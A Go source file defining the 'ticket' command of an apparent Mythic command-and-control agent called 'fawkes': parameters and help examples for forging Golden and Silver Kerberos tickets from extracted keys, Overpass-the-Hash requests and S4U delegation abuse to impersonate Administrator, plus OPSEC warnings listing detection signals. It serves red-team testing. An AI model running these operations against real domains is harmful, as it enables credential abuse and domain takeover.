package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "ticket",
		Description:         "Forge, request, or delegate Kerberos tickets. Forge: Golden/Silver Tickets from extracted keys (offline). Request: Overpass-the-Hash AS exchange with KDC (online). S4U: Constrained delegation abuse via S4U2Self+S4U2Proxy. Outputs kirbi or ccache format.",
		HelpString:          "ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_aes256_key>\nticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_key> -key_type rc4 -format ccache\nticket -action forge -realm CORP.LOCAL -username sqlsvc -domain_sid S-1-5-21-... -key <hex_key> -spn MSSQLSvc/db01.corp.local:1433\nticket -action request -realm CORP.LOCAL -username admin -key <hex_key> -server dc01.corp.local\nticket -action s4u -realm CORP.LOCAL -username sqlsvc -key <hex_key> -server dc01.corp.local -impersonate Administrator -spn cifs/fileserver.corp.local",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002", "T1550.003", "T1134.001"},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "ticket_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				Description:      "Action: forge (offline ticket creation), request (Overpass-the-Hash AS exchange with KDC), s4u (constrained delegation abuse via S4U2Self+S4U2Proxy)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"forge", "request", "s4u"},
				DefaultValue:     "forge",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "realm",
				CLIName:          "realm",
				ModalDisplayName: "Realm (Domain)",
				Description:      "Kerberos realm / AD domain (e.g., CORP.LOCAL)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                 "username",
				CLIName:              "username",
				ModalDisplayName:     "Username",
				Description:          "Username for the ticket. Forge/request: target identity. S4U: service account with delegation rights.",
				DynamicQueryFunction: getCallbackUserList,
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "domain_sid",
				CLIName:          "domain_sid",
				ModalDisplayName: "Domain SID",
				Description:      "Domain SID for forge action (e.g., S-1-5-21-1234567890-1234567890-1234567890). Not needed for request.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "key",
				CLIName:          "key",
				ModalDisplayName: "Key (hex)",
				Description:      "Encryption key in hex (AES256=64 chars, AES128=32 chars, RC4/NTLM=32 chars)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "key_type",
				CLIName:          "key_type",
				ModalDisplayName: "Key Type",
				Description:      "Encryption type: aes256 (default), aes128, rc4/ntlm",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "aes256",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "user_rid",
				CLIName:          "user_rid",
				ModalDisplayName: "User RID",
				Description:      "User's RID (default: 500 for Administrator)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     500,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "kvno",
				CLIName:          "kvno",
				ModalDisplayName: "Key Version Number",
				Description:      "KVNO for the encryption key (default: 2)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     2,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "lifetime",
				CLIName:          "lifetime",
				ModalDisplayName: "Lifetime (hours)",
				Description:      "Ticket lifetime in hours (default: 24)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     24,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "format",
				CLIName:          "format",
				ModalDisplayName: "Output Format",
				Description:      "Output format: kirbi (default, for Rubeus) or ccache (for Linux KRB5CCNAME)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "kirbi",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "spn",
				CLIName:          "spn",
				ModalDisplayName: "SPN (Silver Ticket)",
				Description:      "Service Principal Name. Forge: Silver Ticket target (omit for Golden). S4U: target service for S4U2Proxy (e.g., cifs/dc01.corp.local).",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:                "server",
				CLIName:             "server",
				ModalDisplayName:    "KDC Server",
				Description:         "KDC/Domain Controller address for request/s4u action (e.g., dc01.corp.local or 192.168.1.10)",
				ParameterType:       agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:        "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "impersonate",
				CLIName:          "impersonate",
				ModalDisplayName: "Impersonate User",
				Description:      "S4U: user to impersonate via constrained delegation (e.g., Administrator). Only used with s4u action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			actionVal, _ := taskData.Args.GetStringArg("action")
			msg := fmt.Sprintf("OPSEC WARNING: Kerberos ticket operation (%s). Kerberos event logs (4768/4769/4770) record all ticket requests.", actionVal)
			switch actionVal {
			case "forge":
				msg += " Golden/Silver ticket forgery creates tickets without KDC interaction but forged tickets may have anomalous flags or lifetimes detectable by PAC validation."
			case "request":
				msg += " Overpass-the-Hash generates AS-REQ with pre-auth — indistinguishable from normal auth but encryption downgrade (RC4) is a detection signal."
			case "s4u":
				impersonate, _ := taskData.Args.GetStringArg("impersonate")
				spn, _ := taskData.Args.GetStringArg("spn")
				msg = fmt.Sprintf("OPSEC WARNING: S4U2 constrained delegation abuse (T1550.003). Impersonating %s to %s. S4U generates TGS-REQ with PA-FOR-USER padata (type 129) and cname-in-addl-tkt flag — both are high-fidelity detection signals. Event 4769 with Transited Services field populated indicates delegation chain.", impersonate, spn)
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Kerberos ticket operation completed. Ticket injection/export manipulates credential cache. Event ID 4768/4769 generated for ticket operations.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			realm, _ := taskData.Args.GetStringArg("realm")
			username, _ := taskData.Args.GetStringArg("username")
			spn, _ := taskData.Args.GetStringArg("spn")
			server, _ := taskData.Args.GetStringArg("server")
			impersonate, _ := taskData.Args.GetStringArg("impersonate")

			var displayMsg, artifactMsg string
			switch action {
			case "request":
				displayMsg = fmt.Sprintf("Overpass-the-Hash: %s@%s via %s", username, realm, server)
				artifactMsg = fmt.Sprintf("Kerberos AS-REQ (Overpass-the-Hash) for %s@%s to %s", username, realm, server)
			case "s4u":
				displayMsg = fmt.Sprintf("S4U delegation: %s → %s for %s via %s", username, impersonate, spn, server)
				artifactMsg = fmt.Sprintf("Kerberos S4U2Self+S4U2Proxy: %s impersonating %s for %s to %s", username, impersonate, spn, server)
			default:
				var ticketType string
				if spn == "" {
					ticketType = "Golden Ticket (TGT)"
				} else {
					ticketType = fmt.Sprintf("Silver Ticket (TGS: %s)", spn)
				}
				displayMsg = fmt.Sprintf("Forge %s for %s@%s", ticketType, username, realm)
				artifactMsg = fmt.Sprintf("Forge Kerberos %s for %s@%s", ticketType, username, realm)
			}
			response.DisplayParams = &displayMsg

			createArtifact(taskData.Task.ID, "API Call", artifactMsg)

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			switch action {
			case "forge":
				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") {
					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
						"Kerberos ticket forged (T1558)")
				}
			case "request":
				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") {
					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
						"Overpass-the-Hash TGT obtained (T1550.002)")
				}
			case "s4u":
				impersonate, _ := processResponse.TaskData.Args.GetStringArg("impersonate")
				spn, _ := processResponse.TaskData.Args.GetStringArg("spn")
				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") || strings.Contains(responseText, "S4U2Proxy") {
					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
						fmt.Sprintf("S4U2 delegation: impersonated %s to %s (T1550.003)", impersonate, spn))
					logOperationEvent(processResponse.TaskData.Task.ID,
						fmt.Sprintf("[DELEGATION] S4U2Self+S4U2Proxy: impersonated %s → %s", impersonate, spn), true)
				}
			}
			return response
		},
	})
}
